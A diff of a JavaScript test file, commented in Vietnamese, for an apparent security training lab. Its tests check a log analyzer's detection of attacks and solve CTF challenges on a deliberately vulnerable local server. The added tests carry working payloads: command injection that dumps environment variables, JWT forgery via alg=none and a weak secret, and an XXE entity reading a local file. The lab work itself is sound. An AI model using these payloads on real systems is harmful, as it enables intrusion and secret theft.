@@ -46,6 +46,34 @@ test('detect: log rác/không phải mảng → không Crash', () => {
   assert.equal(analyzeLog('x').totalRequests, 0);
 });
 
+test('detect: nhận diện cmdinj, open-redirect, XXE, upload, JWT probe', () => {
+  const log = [
+    { t: 1, method: 'GET', path: '/tools/ping?host=' + encodeURIComponent('127.0.0.1 & whoami'), ua: 'x', ip: '127.0.0.1' },
+    { t: 2, method: 'GET', path: '/redirect?to=' + encodeURIComponent('https://evil.example'), ua: 'x', ip: '127.0.0.1' },
+    { t: 3, method: 'POST', path: '/api/import', ua: 'x', ip: '127.0.0.1' },
+    { t: 4, method: 'POST', path: '/upload', ua: 'x', ip: '127.0.0.1' },
+    { t: 5, method: 'GET', path: '/api/profile?token=abc.def.ghi', ua: 'x', ip: '127.0.0.1' },
+  ];
+  const r = analyzeLog(log);
+  const types = r.findings.map((f) => f.type);
+  assert.ok(types.includes('cmdinj'), 'phải nhận cmdinj');
+  assert.ok(types.includes('open-redir'), 'phải nhận open-redir');
+  assert.ok(types.includes('xxe'), 'phải nhận xxe');
+  assert.ok(types.includes('upload-abuse'), 'phải nhận upload-abuse');
+  assert.ok(types.includes('jwt-probe'), 'phải nhận jwt-probe');
+});
+
+test('detect: brute-force — ≥5 POST /login từ cùng IP', () => {
+  const log = Array.from({ length: 6 }, (_, i) => ({ t: i, method: 'POST', path: '/login', ua: 'x', ip: '10.0.0.9' }));
+  const r = analyzeLog(log);
+  const bf = r.findings.find((f) => f.type === 'brute-force');
+  assert.ok(bf, 'phải phát hiện brute-force');
+  assert.match(bf.samples[0], /10\.0\.0\.9/);
+  // dưới ngưỡng → không phát hiện
+  const few = analyzeLog(Array.from({ length: 3 }, (_, i) => ({ t: i, method: 'POST', path: '/login', ua: 'x', ip: '10.0.0.9' })));
+  assert.ok(!few.findings.some((f) => f.type === 'brute-force'));
+});
+
 // ---------- CTF tích hợp: vuln giải được, hardened chặn ----------
 
 let vulnServer;
@@ -67,12 +95,12 @@ after(() => {
   hardServer.close();
 });
 
-test('CTF: liệt kê 4 thử thách, tổng 100 điểm, cờ per-instance', async () => {
+test('CTF: liệt kê 7 thử thách, tổng 170 điểm, cờ per-instance', async () => {
   const list = await listChallenges(vulnUrl);
   assert.equal(list.enabled, true);
-  assert.equal(list.challenges.length, 4);
-  assert.equal(list.total, 100);
-  assert.ok(list.challenges.every((c) => /FLAG|traversal|SQL|apiKey|admin/i.test(c.hint)));
+  assert.equal(list.challenges.length, 7);
+  assert.equal(list.total, 170);
+  assert.ok(list.challenges.every((c) => /FLAG|traversal|SQL|apiKey|admin|SECLAB|jwt|file/i.test(c.hint)));
 });
 
 test('CTF: cờ khác nhau giữa hai phiên lab khác nhau', async () => {
@@ -117,7 +145,42 @@ test('CTF: nộp đúng cờ → điểm tăng; nộp sai → ok=false', async (
   const again = await submitFlag(vulnUrl, 4, flag);
   assert.equal(again.ok, true);
   assert.equal(again.score, 20);
-  assert.ok(list.total === 100);
+  assert.ok(list.total === 170);
+});
+
+test('CTF #5: command injection đọc được cờ trong biến môi trường', async () => {
+  const sep = process.platform === 'win32' ? '&' : ';';
+  const cmd = process.platform === 'win32' ? 'set SECLAB' : 'env';
+  const res = await fetch(vulnUrl + `/tools/ping?host=${encodeURIComponent(`127.0.0.1 ${sep} ${cmd}`)}`);
+  const body = await res.text();
+  assert.match(body, /FLAG\{cmd-[0-9a-f]+\}/);
+});
+
+test('CTF #6: JWT alg=none và secret yếu đều lấy được cờ ctfsvc', async () => {
+  const { jwtSign } = await import('../src/lab/jwtx.js');
+  for (const forged of [jwtSign({ sub: 'ctfsvc', role: 'svc' }, '', { alg: 'none' }), jwtSign({ sub: 'ctfsvc', role: 'svc' }, 'secret123')]) {
+    const j = await (await fetch(vulnUrl + '/api/profile?token=' + encodeURIComponent(forged))).json();
+    assert.match(j.flag || '', /FLAG\{jwt-[0-9a-f]+\}/);
+  }
+  // token thật của alice (không phải ctfsvc) KHÔNG lộ cờ — phải forge mới có
+  const tok = await (
+    await fetch(vulnUrl + '/api/token', {
+      method: 'POST',
+      headers: { 'content-type': 'application/x-www-form-urlencoded' },
+      body: 'username=alice&password=alice123',
+    })
+  ).json();
+  const legit = await (await fetch(vulnUrl + '/api/profile?token=' + encodeURIComponent(tok.token))).json();
+  assert.equal(legit.flag, undefined);
+});
+
+test('CTF #7: XXE entity đọc flag-xxe.txt trên filesystem ảo', async () => {
+  const res = await fetch(vulnUrl + '/api/import', {
+    method: 'POST',
+    body: '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag-xxe.txt">]><i><item>&x;</item></i>',
+  });
+  const j = await res.json();
+  assert.match(j.items[0], /FLAG\{xxe-[0-9a-f]+\}/);
 });
 
 test('CTF: hardened TẮT — /_lab/challenges enabled:false và verify 403', async () => {
